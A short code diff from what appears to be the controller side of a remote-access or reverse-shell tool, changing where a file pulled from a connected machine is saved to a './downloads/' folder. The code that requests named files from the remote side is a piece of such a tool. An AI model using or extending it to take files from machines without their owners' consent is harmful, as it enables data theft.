@@ -89,7 +89,7 @@ def command_skeleton(conn):
                 conn.send(cmd.encode())
                 path = input("[i] File to download (include extentsion): ")
                 conn.send(path.encode())
-                f = open(path, 'wb')
+                f = open(f'./downloads/{path}', 'wb')
                 file = conn.recv(BYTES)
                 while not ('complete' in str(file)):
                     f.write(file)
